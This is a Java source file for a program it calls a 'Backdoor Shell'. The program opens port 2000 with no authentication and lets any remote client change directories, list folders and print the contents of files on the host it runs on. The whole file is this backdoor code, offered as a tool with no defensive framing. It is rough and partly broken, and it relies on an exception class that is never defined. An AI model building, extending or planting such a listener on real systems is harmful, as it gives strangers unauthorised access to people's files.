import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.ServerSocket;
import java.net.Socket;
import java.nio.file.DirectoryStream;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.Iterator;
public class BackdoorShell_server {
	public String direct;
	public String OriginalDirectory;
	public boolean NotACommand;
	
	public static void main(String[] args) throws IOException {
		new BackdoorShell_server().run();
	}
	
	public void run() throws IOException {
		Socket s=null;
		ServerSocket ss=null;
		InputStreamReader isr=null;
		OutputStreamWriter osw=null;
		BufferedReader br=null;
		BufferedWriter bw=null;
		String t;
		ss=new ServerSocket(2000);
		String MSG_FROM_CLIENT;
		
		while(true) {
			try {
				s=ss.accept();
				isr=new InputStreamReader(s.getInputStream());
				osw=new OutputStreamWriter(s.getOutputStream());
				br=new BufferedReader(isr);
				bw=new BufferedWriter(osw);
				bw.write("Welcolme to Backdoor Shell Program,\n\n\t\t*Type 'Exit' to Disconnect from Server*");
				bw.newLine();
				bw.write("cd Commands: 'cd', or 'cd .', or 'cd ~'");
				bw.newLine();
				bw.write("dir Command: 'dir'");
				bw.newLine();
				bw.write("cat Command: 'cat (.txt file)'");
				bw.newLine();
				bw.newLine();
				bw.write(System.getProperty("user.dir")+"> ");
				bw.flush();
				String Directory = System.getProperty("user.dir");
				this.OriginalDirectory=Directory;
				this.direct=Directory;
				while (true) {
					MSG_FROM_CLIENT = br.readLine();
					
					//lets server side see clients message.
					System.out.println("Client: "+MSG_FROM_CLIENT);
					
					//exit command.
					if(MSG_FROM_CLIENT.equalsIgnoreCase("exit")||MSG_FROM_CLIENT.equalsIgnoreCase("Exit"))
						break;
					
					//cat command.
					if(MSG_FROM_CLIENT.startsWith("cat ")){
						try {
						String fileToSearch = this.direct+"\\"+MSG_FROM_CLIENT.substring(4);
						File a =new File(fileToSearch);
						BufferedReader reader = new BufferedReader(new FileReader(a));
						String line;
						ArrayList<String> fileContent= new ArrayList<String>();
						while((line = reader.readLine())!=null){
							fileContent.add(line);
							}
							reader.close();
							for(int counter=0;counter<fileContent.size();counter++) {
								bw.write(fileContent.get(counter));
								bw.newLine();
								bw.flush();
							}
						}catch(FileNotFoundException e) {
							bw.write("File could not be found!");
							bw.newLine();
							bw.flush();
						}
							
					}
					//dir command.
					if(MSG_FROM_CLIENT.equalsIgnoreCase("dir")) {
						String cdFile = this.direct+"\\"+MSG_FROM_CLIENT.substring(3);
						File f = new File(cdFile);
						String type;
						if(f.isDirectory()) {
							bw.newLine();
							bw.write("telnet <"+s.getInetAddress()+">");
							bw.newLine();
							bw.write("List of Files in "+f.getPath()+"> ");
							bw.newLine();
							bw.newLine();
					        bw.flush();
					        int counter=0;
							try (DirectoryStream<Path> stream = Files.newDirectoryStream(f.toPath())) {
							    for (Path file: stream) {
							        //System.out.println(file.getFileName());
							    	if(file.getFileName().toString().endsWith("txt")) {
							    		type = "File";}
							    	else
							    		type = "Directory";
							    	counter++;
							        bw.write (file.getFileName().toString()+" - ");
							        bw.write(type);
							        bw.newLine();
							        bw.flush();
							    }
							    bw.newLine();
							    bw.write(counter+" File(s) in total");
							    bw.newLine();
							    bw.write(f.getPath()+"> ");
						        bw.flush();
							} catch (Exception x) {
							    System.err.println(x);
							}
							}
						}
					
					// "cd" command.
					if(MSG_FROM_CLIENT.startsWith("cd")) {
						try {
							if(MSG_FROM_CLIENT.equalsIgnoreCase("cd")) {
								bw.write(this.direct+"> ");
								bw.flush();
							}
							if(MSG_FROM_CLIENT.equalsIgnoreCase("cd ~")) {
								this.direct=this.OriginalDirectory;
								bw.write(this.direct+"> ");
								bw.flush();
							}
							if(MSG_FROM_CLIENT.equalsIgnoreCase("cd .")) {
								Path path = Paths.get(this.direct);
								ArrayList<String> list= new ArrayList<String>();
								for(Iterator<Path> it= path.iterator(); it.hasNext();) {
									list.add(it.next().toString());
								}
								try {
									String remove = list.get( list.size()-1);
									System.out.println(remove);
									String newDirectory=this.direct.replace("\\"+remove, "");
									this.direct=newDirectory;
									bw.write(this.direct+"> ");
									bw.flush();
								}catch(IndexOutOfBoundsException e) {
									System.out.println("At root");
								}
							}
							if(MSG_FROM_CLIENT.length()>4) {
								String cdFile = this.direct+"\\"+MSG_FROM_CLIENT.substring(3);
								File f = new File(cdFile);
							try {
								if(f.isDirectory()) {
									bw.write(cdFile+"> ");
									bw.flush();
								}
								else 
									throw new DirectoryNotFoundException("Directory Not Found");
							}catch(DirectoryNotFoundException e) {
								bw.write("Directory Not Found");
								bw.newLine();
								bw.flush();
							}
							}
							if(MSG_FROM_CLIENT.length()>4) {
								String cdFile = this.direct+"\\"+MSG_FROM_CLIENT.substring(3);
								File f = new File(cdFile);
								try {
									if(f.isDirectory()) {
										this.direct=this.direct+"\\"+MSG_FROM_CLIENT.substring(3);
										bw.write(this.direct+"> ");
									}
								}catch(StringIndexOutOfBoundsException e) {
									bw.write("Directory Not Found");
									bw.newLine();
									bw.flush();
								}
								bw.flush();
							}
						}catch(Exception e) {
							bw.write("Not a valid command.");
							bw.newLine();
							bw.flush();
						}
					}					
				}
				isr.close();
				osw.close();
				br.close();
				bw.close();
			}catch(Exception e) {
				e.printStackTrace();
			}
		}
	}
}

